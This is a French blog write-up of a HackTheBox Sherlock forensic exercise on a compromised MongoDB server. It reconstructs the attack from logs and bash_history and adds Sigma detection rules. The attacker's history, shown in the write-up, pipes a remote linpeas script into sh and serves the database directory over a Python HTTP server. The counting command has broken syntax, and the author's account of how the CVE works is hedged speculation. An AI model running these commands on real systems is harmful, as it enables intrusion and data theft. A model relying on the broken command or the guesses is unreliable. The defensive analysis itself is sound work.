---
title: "HTB Sherlock — MangoBleed : triage DFIR d'un serveur MongoDB compromis"
date: 2026-04-04T12:00:00+02:00
draft: false
tags: ["htb-sherlock", "dfir", "forensic", "blue-team", "mongodb", "linux", "sigma"]
categories: ["Blue Team"]
summary: "Investigation DFIR sur un serveur MongoDB secondaire suspecté compromis via CVE-2025-14847. Analyse d'un triage UAC : logs MongoDB, auth.log, bash_history — reconstruction de la chaîne d'attaque depuis l'exploitation initiale jusqu'à la tentative d'exfiltration."
ShowToc: true
TocOpen: true
---

## Contexte

Tôt le matin, le SOC reçoit une alerte prioritaire : `mongodbsync`, un serveur MongoDB secondaire maintenu une fois par mois, est suspecté d'avoir été compromis via une vulnérabilité identifiée sous le nom **MangoBleed**. L'administrateur a procédé à une acquisition de triage via **UAC (Unix Artifact Collector)** et nous transmet l'archive. La mission : analyser les artefacts collectés, reconstituer la chaîne d'attaque, et émettre un premier rapport d'incident.

Ce Sherlock est classé *Very Easy* sur HackTheBox, mais il illustre un workflow DFIR réaliste : corrélation de sources hétérogènes, conversion de fuseaux horaires, et reconstruction comportementale à partir d'artefacts volatils comme le `bash_history`.

| Champ | Valeur |
|---|---|
| Plateforme | HackTheBox Sherlock |
| Difficulté | Very Easy |
| OS cible | Linux |
| Type | DFIR / Triage forensic |
| CVE | CVE-2025-14847 |
| Techniques MITRE | T1190 · T1059.004 · T1046 · T1071.001 · T1560 |

---

## Artefacts analysés

L'archive UAC (`uac-mongodbsync-linux-triage`) suit la structure de collecte standard de l'outil, avec plusieurs catégories d'artefacts :

```
[root]/          → arborescence système complète (etc, home, lib, root, run, snap, usr, var)
bodyfile/        → bodyfile.txt pour la timeline MFT/inode
hash_executables/ → hash_executables.md5 et .sha1
live_response/   → containers, hardware, network, packages, process, storage, system
system/          → getap.txt, sgid.txt, suid.txt, hidden_files.txt, world_writable_files.txt...
```

Les sources effectivement exploitées au cours de l'investigation sont :

- **`[root]/var/log/mongodb/mongod.log`** — source principale pour l'identification de l'exploitation initiale et le comptage des connexions malveillantes
- **`[root]/var/log/auth.log`** — pivot clé pour dater l'accès shell interactif
- **`[root]/home/mongoadmin/.bash_history`** — artefact le plus riche pour reconstruire le comportement post-accès
- **`live_response/packages/`** — métadonnées des paquets installés, utilisées pour identifier la version MongoDB
- **`[root]/etc/mongod.conf`** — point d'entrée pour identifier les chemins de données pertinents

---

## Analyse

### Task 1 — Identification de la CVE

Le scénario HTB mentionne explicitement une vulnérabilité nommée **MangoBleed** affectant MongoDB. Une recherche sur les bases de données CVE récentes permet d'identifier **CVE-2025-14847**, une vulnérabilité critique dans MongoDB permettant à un attaquant non authentifié d'accéder à des données ou d'exécuter des opérations non autorisées via le protocole de synchronisation des réplicas.

**Réponse Task 1 :** `CVE-2025-14847`

### Task 2 — Version de MongoDB vulnérable

Identifier la version installée nécessite un peu de fouille. Le fichier `mongod.conf` référence le répertoire `/var/lib/mongodb`, ce qui oriente naturellement vers `/var/lib/` dans les artefacts collectés. En explorant cet emplacement, on retrouve les métadonnées des paquets installés : en filtrant sur `mongodb-org`, le numéro de version **8.0.16** apparaît — version effectivement dans le périmètre de la CVE.

> **Note méthodologique :** J'ai d'abord cherché la version dans les logs applicatifs, sans résultat immédiat. Le pivot vers les métadonnées des paquets système (`/var/lib/`) via un CTRL+F sur `mongodb-org` s'est avéré plus efficace. La version `8.0.16` correspondait à la branche vulnérable — ce qui a confirmé que la piste était la bonne.

**Réponse Task 2 :** `8.0.16`

### Task 3 — IP de l'attaquant

L'analyse du journal MongoDB (`mongod.log`) vise à identifier l'origine des connexions suspectes. Les Event IDs MongoDB pertinents pour cette analyse sont :

| Event ID | Type | Description |
|---|---|---|
| 22943 | Connection Accepted | Connexion client établie |
| 51800 | Client Metadata | Métadonnées driver/application du client |
| 22944 | Connection Closed | Déconnexion client |

En filtrant les événements de connexion, une seule adresse IP externe apparaît de manière significative : **65.0.76.43**. Initialement j'ai douté — la présence d'une IP unique dans des logs de connexion peut sembler suspecte et laisser croire à un artefact ou à un log tronqué. Une recherche exhaustive n'a cependant pas révélé d'autre adresse, confirmant que l'attaquant a opéré depuis une infrastructure centralisée.

**Réponse Task 3 :** `65.0.76.43`

### Task 4 — Début de l'exploitation (premier événement malveillant)

La question porte sur le **premier événement malveillant confirmé** dans les logs MongoDB. En filtrant sur l'IP `65.0.76.43`, on remonte au premier événement de connexion enregistré.

Un point d'attention important : les logs MongoDB stockent les timestamps en **UTC**, alors que l'interface Splunk (utilisée pour l'analyse) peut afficher une heure locale (UTC+1 selon la configuration). Il faut donc retravailler les timestamps bruts depuis les logs source plutôt que de s'appuyer sur l'affichage de l'outil d'indexation.

Le premier événement malveillant confirmé est daté du **2025-12-29 à 05:25:52 UTC**.

**Réponse Task 4 :** `2025-12-29 05:25:52`

### Task 5 — Volume total de connexions malveillantes

Pour quantifier l'activité de l'attaquant, on extrait du `mongod.log` l'ensemble des événements de connexion — ouvertures (Event ID 22943) **et** fermetures (Event ID 22944) — associés à l'IP `65.0.76.43`. La commande utilisée :

```bash
cat \[root\]/var/log/mongodb/mongod.log | jq '.' | select(.id == 22944 or .id == 22943) | .id' | wc -l
```

Le résultat — **75 260 événements** — est cohérent avec un comportement de brute-force ou d'énumération intensive sur le protocole de réplication MongoDB.

Ce volume massif suggère une exploitation automatisée plutôt qu'une démarche manuelle. La CVE-2025-14847 implique vraisemblablement un mécanisme requérant de nombreuses tentatives pour aboutir.

**Réponse Task 5 :** `75260`

### Task 6 — Accès interactif : pivot vers auth.log

La question sur l'obtention de l'accès interactif est celle qui a demandé le plus de recul méthodologique. Le réflexe initial est de chercher dans les logs MongoDB — mais la question parle en réalité d'un **accès shell interactif**, ce qui renvoie au journal d'authentification système : `auth.log`.

La leçon ici est simple : quand l'énoncé parle de "connexion au serveur", il faut distinguer connexion applicative (logs MongoDB) et connexion système (auth.log). Un filtre sur l'utilisateur `mongoadmin` dans `auth.log` fait remonter la session SSH ou le spawn de shell interactif au **2025-12-29 à 05:40:03 UTC** — soit environ 14 minutes après le début de l'exploitation, ce qui est cohérent avec le temps nécessaire pour aboutir via brute-force.

> **Note méthodologique :** J'ai perdu du temps à chercher cet événement dans les logs MongoDB. Le pivot vers `auth.log` était le bon réflexe dès que la question mentionnait un accès "interactif" — terme qui désigne un shell, pas une connexion applicative.

**Réponse Task 6 :** `2025-12-29 05:40:03`

### Task 7 — Escalade de privilèges en mémoire : linpeas fileless

Une fois l'accès obtenu, l'attaquant entreprend une phase de reconnaissance système. Le `bash_history` de l'utilisateur `mongoadmin` reconstitue fidèlement la séquence d'actions :

```
ls -la
whoami
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
cd ~
ls -al
cd /
ls
cd /var/lib/mongodb/
ls -la
cd ../
which zip
apt install zip
zip
cd mongodb/
python3 -m http.server 6969
exit
```

La commande clé est l'exécution **fileless** de linpeas : le script est téléchargé et directement pipé dans `sh`, sans jamais être écrit sur le disque. C'est une technique classique d'évasion antivirale — un EDR ne pourra pas analyser le fichier puisqu'il n'existe pas en tant que tel sur le filesystem.

Cette commande était déjà visible lors d'une première exploration des artefacts dès réception de l'archive. L'identification fut immédiate via un `grep -ri linp` sur l'ensemble du triage.

**Réponse Task 7 :** `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh`

### Task 8 — Répertoire ciblé pour l'exfiltration

La suite du `bash_history` est explicite : après l'exécution de linpeas, l'attaquant navigue directement vers `/var/lib/mongodb/`, tente d'installer `zip` pour archiver les données, puis lance un **serveur HTTP Python sur le port 6969** depuis ce répertoire pour exfiltrer son contenu.

```bash
cd /var/lib/mongodb/
...
python3 -m http.server 6969
```

Ce pattern — naviguer vers les données, archiver, serveur HTTP — est une technique d'exfiltration simple mais efficace : elle ne nécessite aucun outil spécialisé et passe souvent sous les radars dans des environnements sans monitoring des connexions sortantes.

La confirmation de cette piste avait d'abord émergé via un `grep -ri 'http.server'` sur l'ensemble des artefacts, qui avait fait remonter les références au serveur Python dans le bash_history.

**Réponse Task 8 :** `/var/lib/mongodb`

---

## Chronologie de l'attaque

```
2025-12-29 05:25:52 UTC  →  Début de l'exploitation CVE-2025-14847 (1ère connexion malveillante)
                         →  ~75 260 tentatives de connexion depuis 65.0.76.43
2025-12-29 05:40:03 UTC  →  Accès shell interactif obtenu (utilisateur : mongoadmin)
                         →  Exécution de whoami, ls — reconnaissance basique
                         →  curl -L linpeas.sh | sh — énumération post-exploitation fileless
                         →  Navigation vers /var/lib/mongodb/
                         →  Tentative d'installation de zip (apt install zip)
                         →  python3 -m http.server 6969 — serveur d'exfiltration
```

---

## Volet défensif

### IOCs

Un IOC est un artefact observable attestant d'une compromission réelle, directement exploitable dans un TIP ou un SIEM pour de la corrélation ou du blocage. Dans ce cas, l'investigation produit un IOC réseau unique et confirmé :

| Type | Valeur | Contexte |
|---|---|---|
| IP | `65.0.76.43` | Adresse source des 75 260 événements de connexion MongoDB malveillants |

### TTPs observées

Les éléments suivants ne sont pas des IOCs — ce sont des **techniques et procédures** (TTPs au sens MITRE ATT&CK) qui décrivent le comportement de l'attaquant. Ils alimentent les règles de détection, pas les listes de blocage.

| Technique | MITRE | Observation |
|---|---|---|
| Exploitation d'un service exposé | T1190 | CVE-2025-14847 sur MongoDB 8.0.16 |
| Exécution fileless | T1059.004 | `curl -L [linpeas] \| sh` — aucun artefact disque |
| Énumération post-accès | T1046 | Exécution de linpeas pour la découverte système |
| Exfiltration via protocole applicatif | T1071.001 | `python3 -m http.server 6969` depuis `/var/lib/mongodb/` |

### Détection

**Phase 1 — Exploitation initiale (CVE-2025-14847)**

L'exploitation génère un volume de connexions anormal sur le port MongoDB (27017 par défaut). 75 260 connexions depuis une IP unique sur une courte fenêtre temporelle constitue un signal fort de brute-force ou d'exploitation automatisée. Un monitoring de type rate-limiting sur les Event IDs 22943/22944 des logs MongoDB, corrélé à une baseline de connexions légitimes, aurait dû déclencher une alerte bien avant l'obtention de l'accès.

**Phase 2 — Exécution fileless de linpeas**

Le pattern `curl [url] | sh` est une technique d'évasion fileless classique : le script n'est jamais écrit sur le disque, ce qui contourne les antivirus basés sur la signature de fichiers. La détection repose sur la surveillance des processus enfants créés par `curl` ou `wget`, et sur l'interception des connexions sortantes vers GitHub depuis un serveur de base de données — comportement qui doit être considéré comme anormal par défaut.

**Phase 3 — Serveur d'exfiltration HTTP**

Le lancement de `python3 -m http.server` depuis `/var/lib/mongodb/` est détectable via la surveillance des connexions réseau sortantes depuis le serveur (port 6969 ou tout port non standard), ainsi que par la surveillance des processus Python lancés par `mongoadmin`.

### Règle Sigma — Brute-force sur MongoDB

```yaml
title: MongoDB Brute-Force or Exploitation Attempt
id: a3f7c901-2d14-4b87-9e56-c1d2f8a30471
status: experimental
description: >
  Détecte un volume anormal de connexions MongoDB depuis une adresse IP unique,
  caractéristique d'un brute-force ou d'une exploitation automatisée (ex. CVE-2025-14847).
references:
  - https://www.cve.org/CVERecord?name=CVE-2025-14847
logsource:
  product: mongodb
  service: mongod
detection:
  selection:
    eventId: 22943
  timeframe: 5m
  condition: selection | count() by client_ip > 500
fields:
  - client_ip
  - timestamp
  - eventId
falsepositives:
  - Outils de monitoring légitimes avec polling intensif
  - Migrations de données en masse
level: high
tags:
  - attack.initial_access
  - attack.t1190
```

### Règle Sigma — Exécution fileless via curl pipe sh

```yaml
title: Fileless Script Execution via curl Pipe Shell
id: b8e2d145-7f3a-4c90-b123-9a0d7e1f5c82
status: experimental
description: >
  Détecte l'exécution en mémoire d'un script distant via le pattern curl|sh ou wget|sh,
  technique courante d'évasion fileless utilisée pour exécuter des outils
  de post-exploitation comme linpeas sans laisser d'artefact disque.
references:
  - https://attack.mitre.org/techniques/T1059/004/
logsource:
  product: linux
  category: process_creation
detection:
  selection_curl:
    Image|endswith:
      - '/curl'
      - '/wget'
    CommandLine|contains:
      - '| sh'
      - '| bash'
      - '|sh'
      - '|bash'
  condition: selection_curl
fields:
  - Image
  - CommandLine
  - ParentImage
  - User
falsepositives:
  - Scripts d'installation légitimes (rare en environnement de production)
level: high
tags:
  - attack.execution
  - attack.t1059.004
  - attack.defense_evasion
  - attack.t1027
```

### Règle Sigma — Serveur HTTP Python depuis répertoire de données

```yaml
title: Python HTTP Server Launched from Database Directory
id: c4d9a217-1e8b-4f05-a789-2b3c6d0e9f14
status: experimental
description: >
  Détecte le lancement d'un serveur HTTP Python depuis un répertoire de données,
  technique d'exfiltration low-tech permettant de servir des fichiers sensibles
  via HTTP sans outil dédié.
logsource:
  product: linux
  category: process_creation
detection:
  selection:
    Image|endswith:
      - '/python3'
      - '/python'
    CommandLine|contains:
      - 'http.server'
      - 'SimpleHTTPServer'
  filter_legit:
    CurrentDirectory|contains:
      - '/var/www'
      - '/srv/http'
  condition: selection and not filter_legit
fields:
  - Image
  - CommandLine
  - CurrentDirectory
  - User
falsepositives:
  - Développeurs en environnement de test
level: medium
tags:
  - attack.exfiltration
  - attack.t1071.001
```

### Recommandations de durcissement

**Patch immédiat.** CVE-2025-14847 affecte MongoDB 8.0.16 — la priorité absolue est la mise à jour vers une version corrigée. Le fait que le serveur ne soit maintenu qu'une fois par mois illustre un problème de politique de patching incompatible avec la criticité d'un service exposé.

**Isolation réseau du port MongoDB.** Le port 27017 (ou tout port MongoDB configuré) ne doit jamais être accessible depuis Internet. Un firewall applicatif ou des règles iptables doivent restreindre les connexions aux seuls hôtes légitimes du réplicaset. L'IP `65.0.76.43` n'aurait jamais dû atteindre le service.

**Monitoring des connexions sortantes.** Un serveur de base de données n'a aucune raison légitime d'initier des connexions sortantes vers GitHub ou de servir du contenu HTTP sur un port arbitraire. Une politique de firewall sortant (egress filtering) et un monitoring des connexions réseau auraient détecté les phases 2 et 3 immédiatement.

**Principe de moindre privilège.** L'utilisateur `mongoadmin` avait un accès suffisant pour installer des paquets (`apt install zip`) et lancer des services réseau. Une séparation des rôles et des permissions limitées auraient réduit la surface d'impact post-exploitation.

**Surveillance du `bash_history`.** Bien que facilement effaçable, le `bash_history` reste un artefact précieux en forensic. Sa centralisation vers un SIEM via `auditd` ou une solution de logging de commandes (ex. `snoopy`, `auditd` avec règles `execve`) aurait permis une détection en temps réel plutôt qu'une découverte post-mortem.

---

## Ce que j'ai appris

Ce Sherlock est un bon exercice de rigueur méthodologique sur les fuseaux horaires et la corrélation multi-sources. Trois leçons pratiques retenues :

**1. Toujours travailler en UTC sur les artefacts bruts.** Les outils d'analyse comme Splunk peuvent afficher des heures locales selon leur configuration. Systématiquement vérifier le timestamp brut dans le log source avant de soumettre une réponse — une erreur d'une heure change complètement la chronologie d'un incident.

**2. Distinguer "connexion applicative" et "connexion système".** Quand un énoncé parle d'accès interactif ou de session shell, la source à consulter est `auth.log` (ou les journaux systemd), pas les logs de l'application. Cette distinction est fondamentale en DFIR et évite de perdre du temps à chercher un événement dans la mauvaise source.

**3. Le `bash_history` est sous-estimé.** Il n'est pas fiable comme seule source (un attaquant expérimenté l'efface ou le désactive), mais quand il est présent, il offre une reconstruction comportementale remarquablement précise. Ici, il a permis de reconstituer l'intégralité de la phase post-exploitation en quelques secondes via un simple `grep`.

Un point à approfondir : la mécanique exacte de CVE-2025-14847 sur le protocole de réplication MongoDB — comprendre pourquoi 75 000 connexions sont nécessaires permettrait d'affiner les seuils de détection dans la règle Sigma.

---

## Outils utilisés

| Outil | Usage |
|---|---|
| UAC (Unix Artifact Collector) | Acquisition du triage sur le système suspect |
| Splunk (instance locale) | Indexation et recherche dans les logs MongoDB et auth.log |
| grep | Recherche rapide dans les artefacts bruts (bash_history, fichiers de config) |
| Navigateur / CTRL+F | Exploration des artefacts texte dans le triage UAC |
